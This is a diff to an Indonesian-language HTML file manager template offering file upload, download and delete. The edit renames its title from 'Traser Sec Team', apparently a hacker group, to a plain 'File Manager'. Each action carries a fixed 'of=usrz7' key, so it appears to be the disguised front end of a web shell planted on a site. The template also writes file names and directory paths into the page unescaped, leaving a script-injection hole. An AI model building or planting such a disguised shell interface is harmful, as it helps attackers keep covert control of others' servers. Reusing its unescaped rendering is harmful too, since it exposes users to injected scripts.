@@ -1,13 +1,13 @@
 <!doctype html>
-<html>
+<html lang="id">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Traser Sec Team</title>
+<title>File Manager</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
 body{margin:0;padding:20px;font-family:Inter,sans-serif;background:#fff;color:#0f172a}
-.card{max-width:1000px;margin:auto;padding:16px;border-radius:12px;background:#fbfdff;box-shadow:0 5px 15px rgba(0,0,0,0.05)}
+.card{max-width:1000px;margin:auto;padding:20px;border-radius:12px;background:#fbfdff;box-shadow:0 5px 15px rgba(0,0,0,0.05)}
 .button{padding:8px 12px;border-radius:8px;border:0;background:#0f172a;color:#fff;cursor:pointer;margin-left:4px}
 .list{margin-top:16px}
 .item{display:flex;justify-content:space-between;padding:6px 8px;border-bottom:1px solid #eef2f7;align-items:center}
@@ -20,43 +20,43 @@ input[type=file]{display:none}
 </head>
 <body>
 <div class="card">
-<div class="breadcrumb">
-<a href="?of=usrz7&dir={{parentDir}}">../</a> {{currentDir}}
-</div>
+  <div class="breadcrumb">
+    <a href="?of=usrz7&dir={{parentDir}}">../</a> {{currentDir}}
+  </div>
 
-<div>
-<form method="post" enctype="multipart/form-data">
-  <label class="button" for="fileinput">Pilih File</label>
-  <input type="file" id="fileinput" name="file" required>
-  <input type="hidden" name="csrf" value="{{csrf}}">
-  <input type="hidden" name="action" value="upload">
-  <button type="submit" class="button">Upload</button>
-</form>
-<div class="notice">{{opmsg}}</div>
-</div>
+  <form method="post" enctype="multipart/form-data" action="filemanager.php?of=usrz7&dir={{currentDir}}">
+    <label class="button" for="fileinput">Pilih File</label>
+    <input type="file" id="fileinput" name="file" required>
+    <input type="hidden" name="csrf" value="{{csrf}}">
+    <input type="hidden" name="action" value="upload">
+    <button type="submit" class="button">Upload</button>
+  </form>
 
-<div class="list">
-<div id="filelist"></div>
+  <div class="notice">{{opmsg}}</div>
+
+  <div class="list" id="filelist"></div>
 </div>
 
 <script>
 const FILES=JSON.parse('{{filelist}}');
 const currentDir='{{currentDir}}';
 const listEl=document.getElementById('filelist');
+
 function renderList(){
   listEl.innerHTML=FILES.map(f=>`<div class="item">
-  <span>${f}</span>
-  <span class="actions">
-    <a href="download.php?file=${encodeURIComponent(f)}&dir=${currentDir}">Download</a>
-    <form method="post" style="display:inline">
-      <input type="hidden" name="file" value="${f}">
-      <input type="hidden" name="csrf" value="{{csrf}}">
-      <input type="hidden" name="action" value="delete">
-      <button type="submit">Delete</button>
-    </form>
-  </span>
+    <span>${f}</span>
+    <span class="actions">
+      <a href="download.php?file=${encodeURIComponent(f)}&dir=${currentDir}">Download</a>
+      <form method="post" style="display:inline" action="filemanager.php?of=usrz7&dir=${currentDir}">
+        <input type="hidden" name="file" value="${f}">
+        <input type="hidden" name="csrf" value="{{csrf}}">
+        <input type="hidden" name="action" value="delete">
+        <button type="submit">Delete</button>
+      </form>
+    </span>
   </div>`).join('');
 }
+
 renderList();
 </script>
 </body>
